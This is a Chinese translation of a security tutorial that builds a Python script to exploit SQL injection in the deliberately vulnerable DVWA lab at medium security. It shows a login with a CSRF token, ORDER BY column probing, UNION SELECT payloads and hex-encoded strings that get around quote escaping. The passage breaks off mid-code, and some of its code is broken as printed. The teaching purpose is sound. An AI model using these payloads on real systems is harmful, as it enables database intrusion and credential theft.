<html>
<head>
<title>Hack With SQL Injection Attacks! DVWA medium security — StackZero</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">用SQL注入攻击黑客！DVWA中等安全性—堆栈零</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hack-with-sql-injection-attacks-dvwa-medium-security-stackzero-d4af0a9a5f9?source=collection_archive---------1-----------------------#2022-08-29">https://infosecwriteups.com/hack-with-sql-injection-attacks-dvwa-medium-security-stackzero-d4af0a9a5f9?source=collection_archive---------1-----------------------#2022-08-29</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><figure class="gl gn jr js jt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi jq"><img src="../Images/b99e5824e9ba4a45555729be31b1246f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*_PeVXU0MoYX9G5ZD.jpg"/></div></div></figure><h1 id="43ab" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">学习SQL注入的最好方法</h1><p id="9130" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">这是一篇非常实用的文章，如果你有耐心读完，它将教你如何用Python为DVWA编写一个自动化的SQL注入漏洞。我们还会看到如何改变转义函数(是的，这不足以保证应用程序的安全)。我认为学习SQL注入的最好方法是将其付诸实践。<br/>这就是为什么，正如我们在<a class="ae lx" href="https://medium.com/bugbountywriteup/how-to-hack-with-sql-injection-attacks-dvwa-low-security-stackzero-9286d7d0dfd1" rel="noopener">这篇文章</a>中所做的，我想继续尝试利用DVWA中等安全性并学习SQL注入。<br/>我还想给大家演示一下如何手动操作，以便更好地理解整个过程。在本教程中，我不会展示准备阶段，但我想当然地认为读者会有一个工作的DVWA机器。<br/>如果不知道怎么做，请看这里的第一部<a class="ae lx" href="https://medium.com/bugbountywriteup/how-to-hack-with-sql-injection-attacks-dvwa-low-security-stackzero-9286d7d0dfd1" rel="noopener"/>。</p><p id="7d16" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">这里列出了所有关于SQL注入的文章，以便快速浏览:</p><h1 id="6898" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">带内SQL注入</h1><ul class=""><li id="552c" class="md me it lb b lc ld lg lh lk mf lo mg ls mh lw mi mj mk ml bi translated"><a class="ae lx" href="https://medium.com/codex/sql-injection-what-you-need-to-know-stackzero-abc80bc1ea5e" rel="noopener"> SQL注入:您需要了解的内容</a></li><li id="927d" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated"><a class="ae lx" href="https://medium.com/bugbountywriteup/learn-sql-injection-in-practice-by-hacking-vulnerable-application-stackzero-ef7931c72aec" rel="noopener">通过黑客攻击易受攻击的应用程序，在实践中学习SQL注入！</a></li><li id="1d91" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated"><a class="ae lx" href="https://medium.com/bugbountywriteup/how-to-hack-with-sql-injection-attacks-dvwa-low-security-stackzero-9286d7d0dfd1" rel="noopener">如何用SQL注入攻击进行黑客攻击！DVWA低安全性</a></li><li id="aa01" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated"><a class="ae lx" rel="noopener ugc nofollow" target="_blank" href="/hack-with-sql-injection-attacks-dvwa-medium-security-stackzero-d4af0a9a5f9">黑客用SQL注入攻击！DVWA中等安全性</a></li><li id="a5dc" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated"><a class="ae lx" rel="noopener ugc nofollow" target="_blank" href="/hack-with-sql-injection-attacks-dvwa-high-security-stackzero-713638840515">黑客用SQL注入攻击！DVWA高安全性</a></li></ul><h1 id="bf10" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">盲人SQL注入</h1><ul class=""><li id="a86b" class="md me it lb b lc ld lg lh lk mf lo mg ls mh lw mi mj mk ml bi translated"><a class="ae lx" rel="noopener ugc nofollow" target="_blank" href="/how-i-exploited-blind-sqli-without-using-any-tool-stackzero-396e831ecbdf">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第1部分)</a></li><li id="8507" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated"><a class="ae lx" rel="noopener ugc nofollow" target="_blank" href="/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-2-stackzero-a5c0acf431dc">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第2部分)</a></li><li id="f1cd" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated"><a class="ae lx" rel="noopener ugc nofollow" target="_blank" href="/burp-suite-no-thanks-blind-sqli-in-dvwa-with-python-part-3-stackzero-911545003f01">打嗝组曲？不用了，谢谢！用Python实现DVWA中的盲SQLi(第3部分)</a></li></ul><h1 id="e587" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">DVWA SQL注入快速概览</h1><p id="f9cf" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">在开始之前，让我们登录，设置一个中等安全级别，并移动到DVWA的SQL注入页面。</p><p id="66b8" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">这是我们应该看到的:</p><figure class="ms mt mu mv gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi mr"><img src="../Images/48f1c1de0b56ea7c990e48d51362a305.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*VUR2PFFQJkUkfJHr.jpg"/></div></div></figure><p id="43e4" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">从这个页面来看，很明显我们没有自由输入，所以为了获得更多信息，让我们检查一下元素的代码(在Firefox中右键单击+Q)。</p><p id="8239" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">我们对表单代码感兴趣，这就是我们所看到的:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="b5f7" class="nb kc it mx b gy nc nd l ne nf">&lt;form action="#" method="POST"&gt;<br/>  &lt;p&gt; User ID: &lt;select name="id"&gt;<br/>      &lt;option value="1"&gt;1&lt;/option&gt;<br/>      &lt;option value="2"&gt;2&lt;/option&gt;<br/>      &lt;option value="3"&gt;3&lt;/option&gt;<br/>      &lt;option value="4"&gt;4&lt;/option&gt;<br/>      &lt;option value="5"&gt;5&lt;/option&gt;<br/>    &lt;/select&gt;<br/>    &lt;input type="submit" name="Submit" value="Submit"&gt;<br/>  &lt;/p&gt;<br/>&lt;/form&gt;</span></pre><p id="c8b8" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">所以我们能得到的信息是:</p><ul class=""><li id="ab37" class="md me it lb b lc ly lg lz lk ng lo nh ls ni lw mi mj mk ml bi translated">该操作链接到页面本身</li><li id="9c18" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">与第一部分不同，这是一个<a class="ae lx" href="https://en.wikipedia.org/wiki/POST_(HTTP)" rel="noopener ugc nofollow" target="_blank"> POST </a>请求</li></ul><p id="3f7c" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">现在我们有了这些信息，我们可以准备一个详细的行动计划。</p><p id="af36" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">或许你可以在网上找到大量的教程，向你解释如何使用Burp Suite解决这个问题。但是我想向您展示如何使用Python获得相同的结果。<br/>我坚信了解SQLi如何工作的最好方法是亲自动手！<br/>因此，我想向您展示如何通过一个简单的Python脚本获得结果！</p><h1 id="3a83" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">准备环境</h1><p id="d431" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">先决条件没有那么多，除了在我们的OS上有Python 3(默认安装在<a class="ae lx" href="https://www.stackzero.net/how-to-install-kali-linux-on-virtualbox-in-a-few-minutes/" rel="noopener ugc nofollow" target="_blank"> Kali Linux </a>上)，我们还必须安装那些库:</p><ul class=""><li id="8adc" class="md me it lb b lc ly lg lz lk ng lo nh ls ni lw mi mj mk ml bi translated"><a class="ae lx" href="https://www.crummy.com/software/BeautifulSoup/" rel="noopener ugc nofollow" target="_blank"> BeautifulSoup </a>:负责解析HTML的库。</li><li id="44b3" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated"><a class="ae lx" href="https://requests.readthedocs.io/en/latest/" rel="noopener ugc nofollow" target="_blank">请求</a>:帮助发送HTTP请求的库。</li></ul><p id="0454" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">因此，我们可以在终端上安装我们需要的所有东西，只需简单的一行代码:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="e79b" class="nb kc it mx b gy nc nd l ne nf">pip install requests_html</span></pre><p id="d403" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">在依赖项的安装过程结束后，我们终于可以开始编写代码了！</p><h1 id="eb55" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">如何用Python请求登录DVWA？</h1><p id="ab7d" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">如果我们想使用Python模块，我们将面临的第一个问题是，在使用SQLi之前，我们需要登录到应用程序。<br/>最简单的方法是使用像<a class="ae lx" href="https://portswigger.net/burp" rel="noopener ugc nofollow" target="_blank"> Burp Suite </a>这样的工具，但这不是深入理解的最佳方式，所以让我们试着只使用我们的脚本技巧来完成任务！<br/>登录问题有多种解决方案:</p><ul class=""><li id="364a" class="md me it lb b lc ly lg lz lk ng lo nh ls ni lw mi mj mk ml bi translated">使用类似<a class="ae lx" href="https://selenium-python.readthedocs.io/" rel="noopener ugc nofollow" target="_blank"> Selenium </a>的浏览器自动化库。</li><li id="01ad" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">将会话cookie复制粘贴到Python脚本中</li><li id="1dc3" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">使用来自请求的会话类</li></ul><p id="da01" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">在本教程中，我会选择第三个。</p><p id="4575" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">第一步是看一看登录页面的HTML代码，特别是，我们需要了解表单是如何工作的。</p><p id="7a9a" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">这是代码检查后的样子:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="914e" class="nb kc it mx b gy nc nd l ne nf">&lt;form action="login.php" method="post"&gt;<br/>  &lt;fieldset&gt;<br/>    &lt;label for="user"&gt;Username&lt;/label&gt;<br/>    &lt;input type="text" class="loginInput" size="20" name="username"&gt;<br/>    &lt;br&gt;<br/>    &lt;label for="pass"&gt;Password&lt;/label&gt;<br/>    &lt;input type="password" class="loginInput" autocomplete="off" size="20" name="password"&gt;<br/>    &lt;br&gt;<br/>    &lt;br&gt;<br/>    &lt;p class="submit"&gt;<br/>      &lt;input type="submit" value="Login" name="Login"&gt;<br/>    &lt;/p&gt;<br/>  &lt;/fieldset&gt;<br/>  &lt;input type="hidden" name="user_token" value="5fa49c3b3f753faf6fc7a1c5386ae86f"&gt;<br/>&lt;/form&gt;</span></pre><p id="c4e2" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">我们可以收集复制请求所需的信息:</p><ul class=""><li id="0328" class="md me it lb b lc ly lg lz lk ng lo nh ls ni lw mi mj mk ml bi translated">表单操作是“login.php”</li><li id="cd4b" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">方法是<a class="ae lx" href="https://en.wikipedia.org/wiki/POST_(HTTP)" rel="noopener ugc nofollow" target="_blank">贴</a></li><li id="a804" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">用户名的输入字段将“<em class="nj">用户名</em>作为名称属性</li><li id="6406" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">密码的输入字段将“<em class="nj">密码”</em>作为名称属性</li><li id="0daf" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">有一个<a class="ae lx" href="https://en.wikipedia.org/wiki/Cross-site_request_forgery" rel="noopener ugc nofollow" target="_blank"> CSRF </a>令牌，其名称属性为“<em class="nj">用户令牌</em></li></ul><p id="89c1" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">给定这些信息，我们需要一个方法来返回一个有效的请求会话，我们可以在这个会话上工作！</p><p id="3112" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">在写它之前，我们需要另一条信息:是否有一些我们想要设置的cookies？<br/>我们可以通过在Firefox上按SHIFT+F9来检查，结果应该是这样的:</p><figure class="ms mt mu mv gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi nk"><img src="../Images/4385cba76ff259e9ca8ded45e31ffa7a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*K2VLLiRaM0WOmQBN.jpg"/></div></div></figure><p id="579d" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">因此，很明显，我们必须将安全级别设置到cookies中，只是为了使代码更具可读性，我们将所有级别保存在一个全局数组中。<br/>让我们看看代码</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="9421" class="nb kc it mx b gy nc nd l ne nf">security_levels =  ["low", <br/>                    "medium", <br/>                    "high", <br/>                    "impossible"]</span><span id="f1fc" class="nb kc it mx b gy nl nd l ne nf">def login(url, security):<br/>    s = requests.Session()<br/>    s.cookies.set("security", security_levels[security])<br/>    response = s.get(url)<br/>    soup = BeautifulSoup(response.text, "html.parser")<br/>    user_token = soup.find("input", {"name": "user_token"})<br/>    <br/>    data = {<br/>        "username": "admin",<br/>        "password": "password",<br/>        "Login": "Login",<br/>        "user_token": user_token["value"]<br/>    }<br/>    response = s.post(url, data=data)<br/>    <br/>    return s</span></pre><p id="21df" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">代码正在进行一些简单的操作:</p><ul class=""><li id="7724" class="md me it lb b lc ly lg lz lk ng lo nh ls ni lw mi mj mk ml bi translated">它创建一个会话对象，设置安全cookie，然后向一个URL(登录页面的URL)发出一个<a class="ae lx" href="https://www.w3schools.com/tags/ref_httpmethods.asp" rel="noopener ugc nofollow" target="_blank"> GET </a>请求。</li><li id="0e6e" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">它将响应解析为HTML，找到具有name属性“user_token”的输入元素，并使用用户名、<em class="nj">密码</em>和<em class="nj"> user_token </em>的数据创建一个字典。<br/>(刚刚在<a class="ae lx" href="https://en.wikipedia.org/wiki/Cross-site_request_forgery" rel="noopener ugc nofollow" target="_blank"> CSRF </a>令牌上快速刷新；它是一个随机生成的值，必须发送到操作页面，以证明请求的合法性。)</li><li id="915c" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">然后，它向带有数据字典的URL发出一个<a class="ae lx" href="https://en.wikipedia.org/wiki/POST_(HTTP)" rel="noopener ugc nofollow" target="_blank"> POST </a>请求。</li><li id="2d15" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">它返回一个有效的会话，我们可以用它来处理下一个请求。</li></ul><h1 id="bcba" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">使用请求发送DVWA SQLi部分中的查询</h1><p id="ef5b" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">现在我们有了会话，我们不必担心cookies，我们可以将所有的精力集中在利用上。<br/>正如我们在<a class="ae lx" href="https://medium.com/bugbountywriteup/how-to-hack-with-sql-injection-attacks-dvwa-low-security-stackzero-9286d7d0dfd1" rel="noopener">之前的文章</a>中看到的，关于DVWA上的SQL注入，同样使用level medium，我们需要运行许多查询。</p><p id="c40d" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">所以避免代码重复的最好方法是定义一个函数来发送查询。</p><p id="f0cd" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">先看代码再评论吧！</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="22d0" class="nb kc it mx b gy nc nd l ne nf">def send_query(query, session):</span><span id="54a7" class="nb kc it mx b gy nl nd l ne nf">data = { "id": query,<br/>            "Submit": "Submit"<br/>    }<br/>    <br/>    response = session.post(sqli_url, data=data)<br/>    soup = BeautifulSoup(response.text, "html.parser")<br/>    final_result = soup.find("pre")<br/>    return final_result</span></pre><p id="854e" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">这个方法非常简单明了。</p><ul class=""><li id="b910" class="md me it lb b lc ly lg lz lk ng lo nh ls ni lw mi mj mk ml bi translated">是一个向网站提交<a class="ae lx" href="https://en.wikipedia.org/wiki/SQL" rel="noopener ugc nofollow" target="_blank"> SQL </a>查询并返回结果的函数。</li><li id="4b8c" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">该查询作为一个<a class="ae lx" href="https://en.wikipedia.org/wiki/POST_(HTTP)" rel="noopener ugc nofollow" target="_blank"> POST </a>请求提交，查询字符串在“id”参数中。</li><li id="715c" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">结果作为最终将被打印的BeautifulSoup对象返回。</li></ul><h1 id="1272" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">准备剧本</h1><p id="9d08" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">为了使我们的工作更容易，首先要做的是设置一些全局变量:</p><ul class=""><li id="8a23" class="md me it lb b lc ly lg lz lk ng lo nh ls ni lw mi mj mk ml bi translated"><strong class="lb iu"> IP地址:</strong>它很可能会改变，所以我们需要一个舒适的地方来改变它。</li><li id="2c69" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated"><strong class="lb iu">安全级别:</strong>它使代码更具可读性</li><li id="e392" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated"><strong class="lb iu">查询:</strong>不止一个变量，它是一个节。事实上，我们需要运行不同的查询，所以最好将它们放在一个可见的地方，最终的想法是将所有要在脚本中使用的查询放在源代码的这一部分。</li></ul><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="e135" class="nb kc it mx b gy nc nd l ne nf"># Cookies for security level<br/>security_levels =  ["low", <br/>                    "medium", <br/>                    "high", <br/>                    "impossible"]<br/># URL section<br/>base_ip = "10.10.91.189"<br/>login_url = f"<a class="ae lx" href="http://{base_ip}/login.php" rel="noopener ugc nofollow" target="_blank">http://{base_ip}/login.php</a>"<br/>sqli_url = f"<a class="ae lx" href="http://{base_ip}/vulnerabilities/sqli/" rel="noopener ugc nofollow" target="_blank">http://{base_ip}/vulnerabilities/sqli/</a>"</span><span id="75a3" class="nb kc it mx b gy nl nd l ne nf"># Query section<br/>query = "1' OR 1=1 #"</span></pre><p id="c3d9" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">现在我们需要编写我们的main，运行脚本并查看结果，这只是一个快速测试:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="46ec" class="nb kc it mx b gy nc nd l ne nf">def beautify_query_single(query_result):<br/>    beautified_query_result = str(query_result).replace('&lt;br/&gt;', '\n'<br/>            ).replace('&lt;pre&gt;', '').replace('&lt;/pre&gt;', '')<br/>    return beautified_query_result.splitlines()[2].split(':')[1].strip()</span><span id="3833" class="nb kc it mx b gy nl nd l ne nf">def beautify_query_double(query_result):<br/>    beautified_query_result = str(query_result).replace('&lt;br/&gt;', '\n'<br/>            ).replace('&lt;pre&gt;', '').replace('&lt;/pre&gt;', '')<br/>    return beautified_query_result.splitlines()[1].split(':')[1] + ' ' \<br/>        + beautified_query_result.splitlines()[2].split(':')[1]</span><span id="3159" class="nb kc it mx b gy nl nd l ne nf">if __name__ == "__main__":</span><span id="b342" class="nb kc it mx b gy nl nd l ne nf">session = login(login_url, 1)<br/>    response = session.get(sqli_url)<br/>    soup = BeautifulSoup(response.text, "html.parser")<br/>    query_result = beautify_query(send_query(query, session))<br/>    beautified_query_result = (<br/>        query_result.replace("&lt;br/&gt;", "\n").replace("&lt;pre&gt;", "").replace("&lt;/pre&gt;", "")<br/>    )<br/>    print(beautified_query_result)</span></pre><p id="89b7" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">这段代码是这样做的:</p><ul class=""><li id="40d9" class="md me it lb b lc ly lg lz lk ng lo nh ls ni lw mi mj mk ml bi translated">使用登录URL、用户名和密码登录网站，安全级别为中等。</li><li id="05ab" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">访问SQLi URL。</li><li id="10f8" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">向网站发送查询。</li><li id="0163" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">打印查询结果。</li></ul><p id="ee04" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated"><em class="nj">美化_查询</em>函数只是移除了HTML标签，并将查询_结果的格式设置得更好一些。<br/><em class="nj">single</em>版本只返回一个值，而<em class="nj"> double </em>版本返回两个值，当我们想要在脚本结束时一起检索用户名和密码时，这很有用。</p><p id="e844" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">通过使用前面的查询运行脚本，我们得到一个错误:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="8cfd" class="nb kc it mx b gy nc nd l ne nf">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' OR 1=1#' at line 1</span></pre><p id="6fe1" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">错误似乎出在单引号上，它被删除了，通过删除它，一切似乎都正常工作了。</p><figure class="ms mt mu mv gt ju gh gi paragraph-image"><div class="gh gi nm"><img src="../Images/3b478d4c17e552826378c0e984247ac8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1298/format:webp/0*5ZqOQLVjtAcRD3MW.jpg"/></div></figure><h1 id="63de" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">运行脚本并利用SQLi</h1><p id="12ad" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">在此之前，我们可以运行我们之前看到的使用GROUP BY技术的main，以便了解查询中涉及的列数。<br/>为此，让我们将该查询替换为:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="4049" class="nb kc it mx b gy nc nd l ne nf">1 ORDER BY 1 # <br/>1 ORDER BY 2 # <br/>1 ORDER BY 3 # <br/>...</span></pre><p id="7873" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">当我们数到三时，会出现一个错误:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="33a6" class="nb kc it mx b gy nc nd l ne nf">Unknown column '3' in 'order clause'</span></pre><p id="a2ce" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">现在我们知道有两列。</p><p id="f8c8" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">现在我们只需要运行我们在<a class="ae lx" href="https://medium.com/bugbountywriteup/how-to-hack-with-sql-injection-attacks-dvwa-low-security-stackzero-9286d7d0dfd1" rel="noopener">上一篇文章</a>中看到的几乎相同的查询，只做一些修改。</p><h1 id="84b0" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">关于架构的信息</h1><p id="981c" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">我们理解模式细节的方式与前一部分没有太大的不同。<br/>首先，我们要定义查询:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="b6e1" class="nb kc it mx b gy nc nd l ne nf">query_version = "-1 UNION SELECT 1, VERSION()#" <br/>query_database = "-1 UNION SELECT 1,DATABASE() #"</span></pre><p id="74ec" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">然后是main方法中的相关部分:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="bda5" class="nb kc it mx b gy nc nd l ne nf">print("The database version is:") print(beautify_query_single(send_query(query_version, session)[0])) print() <br/>print("The database name is:") <br/>db_name = beautify_query_single(send_query(query_database, session)[0]) <br/>print(db_name) print()</span></pre><h1 id="8aeb" class="kb kc it bd kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky bi translated">如何在SQL注入攻击中使用不带引号的字符串</h1><p id="d826" class="pw-post-body-paragraph kz la it lb b lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw im bi translated">正如我们在前面的测试中所看到的，服务器很可能在逃避我们的引用，所以我们需要一种技术来绕过这个障碍。<br/>我们有两种方法:</p><ul class=""><li id="0751" class="md me it lb b lc ly lg lz lk ng lo nh ls ni lw mi mj mk ml bi translated">通过字符的<a class="ae lx" href="https://en.wikipedia.org/wiki/ASCII" rel="noopener ugc nofollow" target="_blank"> ASCII </a>值连接字符</li><li id="6c52" class="md me it lb b lc mm lg mn lk mo lo mp ls mq lw mi mj mk ml bi translated">使用十进制表示</li></ul><p id="f9d6" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">让我们来看看这两种情况的一个快速示例，我们希望从名为“users”的表中选择一个密码，其中用户名是“john”:</p><p id="7fd6" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">经典SQL查询:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="74df" class="nb kc it mx b gy nc nd l ne nf">SELECT password FROM users WHERE username='john'</span></pre><p id="7f24" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">相同的查询，但是使用了由ASCII值选择的字符的串联:</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="8663" class="nb kc it mx b gy nc nd l ne nf">SELECT password FROM users WHERE username=CONCAT(CHAR(106),CHAR(111),CHAR(104),CHAR(110))</span></pre><p id="456e" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">最后，让我们看看我们将在本教程中使用的技术，使用十六进制表示。</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="11c2" class="nb kc it mx b gy nc nd l ne nf">SELECT password FROM users WHERE username=0x6a6f686e</span></pre><p id="b868" class="pw-post-body-paragraph kz la it lb b lc ly le lf lg lz li lj lk ma lm ln lo mb lq lr ls mc lu lv lw im bi translated">在尝试将我们刚刚学到的东西付诸实践之前，我只想向您展示如何用Python将字符串转换成十六进制表示</p><pre class="ms mt mu mv gt mw mx my mz aw na bi"><span id="2133" class="nb kc it mx b gy nc nd l ne nf">name = "john" <br/>hex_name = 